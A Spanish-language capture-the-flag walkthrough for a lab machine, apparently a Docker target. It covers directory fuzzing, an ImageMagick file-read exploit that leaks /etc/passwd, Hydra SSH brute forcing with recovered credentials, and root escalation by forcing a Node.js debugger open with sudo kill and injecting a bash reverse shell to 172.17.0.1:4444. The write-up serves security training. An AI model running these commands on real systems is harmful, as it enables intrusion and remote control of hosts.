## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 443 : SSL/HTTP

En la web el puerto 80 y 443 comparten la misma página, la cual es un convertidor de tamaños en imágenes, no veo nada interesante y aplico un fuzzeo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Encuentro “info.php”

Dentro hay una lista de las extensiones instaladas, interesa “imagick”. Buscando una vulnerabilidad encuentro una:

https://github.com/Sybil-Scan/imagemagick-lfi-poc

Así que la clono en mi máquina atacante:

```bash
git clone https://github.com/Sybil-Scan/imagemagick-lfi-poc.git
cd imagemagick-lfi-poc/
# Instalar dependencias:
apt install cargo
```

Probaremos primero a ver el archivo `passwd`, lo haremos de la siguiente forma:

```bash
python3 generate.py -f /etc/passwd -o passwd.png
```

Se genera una imagen llamada passwd.png que subiré a la web.

Dentro le pido que la redimensione ( 200,200 ) y descargo la imagen de resultado. 

La inspecciono con la siguiente herramienta:

```bash
identify -verbose nueva_imagen.png
```

Dentro hay una cadena enorme en hexadecimal con el contenido de /etc/passwd, 

```bash
1297726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a6170706c69636174696f6e3a783a313030303a313030303a3a2f686f6d652f6170706c69636174696f6e3a2f62696e2f626173680a73797374656d642d6e6574776f726b3a783a3130313a3130343a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d642f6e657469663a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130353a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d642f7265736f6c76653a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130363a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130343a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a6c656e616d3a783a313030313a313030313a3a2f686f6d652f6c656e616d3a2f62696e2f626173680a
```

Encuentro un script en el writeup de Dise0 y lo utilizo para decriptar el contenido:

```python
import sys
import re

def validate_hex_data(hex_data):
    """
    Valida y limpia la cadena hexadecimal.
    :param hex_data: Cadena en formato hexadecimal.
    :return: Cadena hexadecimal limpia o un error si no es válida.
    """
    # Eliminar espacios y saltos de línea.
    hex_data = re.sub(r'\s+', '', hex_data)
    if not re.fullmatch(r'[0-9a-fA-F]*', hex_data):
        raise ValueError("El archivo contiene caracteres no válidos para hexadecimal.")
    return hex_data

def hex_to_text(hex_data):
    """
    Convierte una cadena hexadecimal a texto plano.
    :param hex_data: Cadena en formato hexadecimal.
    :return: Cadena en texto plano.
    """
    try:
        # Decodifica el texto hexadecimal a bytes.
        byte_data = bytes.fromhex(hex_data)
        # Trata de convertir el contenido a texto usando 'utf-8' o 'latin-1'
        try:
            text = byte_data.decode('utf-8')
        except UnicodeDecodeError:
            # Si no puede decodificar en utf-8, intenta con latin-1 (que permite caracteres no válidos en utf-8)
            text = byte_data.decode('latin-1', errors='ignore')
        
        return text
    except Exception as e:
        raise ValueError(f"Error al convertir la cadena hexadecimal: {e}")

def main():
    """
    Función principal que lee el archivo y traduce el contenido hexadecimal.
    """
    if len(sys.argv) < 2:
        print("Uso: python3 decoderHexa.py <archivo_hexadecimal>")
        sys.exit(1)

    file_path = sys.argv[1]

    try:
        with open(file_path, 'r') as file:
            # Lee todo el contenido del archivo.
            hex_data = file.read()

        # Limpia y valida la cadena hexadecimal.
        clean_data = validate_hex_data(hex_data)

        # Convierte la cadena limpia a texto.
        translated_text = hex_to_text(clean_data)

        # Muestra el texto traducido.
        print("Texto traducido:\n")
        print(translated_text)

    except FileNotFoundError:
        print(f"Error: No se pudo encontrar el archivo '{file_path}'.")
    except ValueError as ve:
        print(f"Error de validación: {ve}")
    except Exception as e:
        print(f"Error inesperado: {e}")

if __name__ == "__main__":
    main()
```

El codigo en Hexadecimal lo pongo en un archivo txt y ejecuto:

```python
python3 decoderHexa.py <FILE>.txt
```

Dentro observamos que hay 2 usuarios y los agrego a una archivo txt y aplico un ataque de fuerza bruta con hydra.

User.txt:

```python
lenam
application 
```

Ataque:

```python
hydra -L users.txt -P rockyou.txt ssh://172.17.0.2 -t 64
```

Encuentro credenciales:

User : lenam

Pass : loverboy

## Escalada

```python
sudo -l
(ALL) /bin/kill
```

En ese caso enumero procesos:

```python
netstat -tuln
```

Hay 2 puertos en local interesantes:

```python
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
```

Con Curl veo su contenido:

```python
curl http://localhost:8000/
# Info:
"Hello World from nodejs."
```

Se identica la vulnerabilidad ya que node se maneja con un debugger. 

Explicación técnica:

Voy a matar el proceso con `kill` en el puerto `8000` para que así se reinicie y nos muestre el puerto de depuración del propio `node.js` cuando se reinicie, que ha esto se le llama hacer una señal `SIGUSR1`,  por lo que cuando intentemos detener el proceso, tendrá como consecuencia el reinicio del mismo exponiendo el puerto de depuración  que viene por defecto en el puerto `9229` el cual podremos aprovechar para inyectar código malicioso ya que este depurador interactúa con el `node.js` en tiempo real a nivel de ejecución.

Para eso hay que identificar el PID:

```python
ps aux | grep node
# Info:
root          54  0.0  0.3 922032 29576 ?        Sl   14:53   0:00 /usr/bin/node /index.js
lenam        937  0.0  0.0  13076  2432 pts/0    S+   16:44   0:00 grep --color=auto node
```

Es el 54:

```python
sudo kill -SIGUSR1 54
```

Volviendo a enumerar puertos se ve que el puerto 9229 está abierto. Toca iniciar el debugger:

```python
node inspect 127.0.0.1:9229
```

Toca ejecutar una reverse shell, sabemos que va a tener privilegios root por qué el proceso se esta ejecutando con esos permisos.

```python
debug> exec("process.mainModule.require('child_process').exec('bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"')")
```

Me pongo en escucha :

```python
nc -lvnp 4444
```

Listo.
